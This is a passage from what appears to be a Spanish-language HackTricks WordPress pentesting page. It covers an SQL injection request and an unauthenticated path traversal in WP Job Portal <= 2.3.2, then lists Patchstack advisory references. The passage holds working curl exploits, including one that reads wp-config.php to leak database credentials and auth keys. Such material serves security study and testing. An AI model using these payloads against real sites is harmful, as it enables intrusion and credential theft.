-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La respuesta revela el resultado de la consulta inyectada o modifica la base de datos, demostrando SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Otra tarea, **downloadcustomfile**, permitía a los visitantes descargar **cualquier archivo en disco** mediante path traversal. El vulnerable sink está ubicado en `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` está controlado por un atacante y concatenado **sin sanitización**. Nuevamente, la única barrera es un **CSRF nonce** que puede obtenerse desde la página de resumen.

#### Explotación
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
El servidor responde con el contenido de `wp-config.php`, leaking DB credentials and auth keys.

## Referencias

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
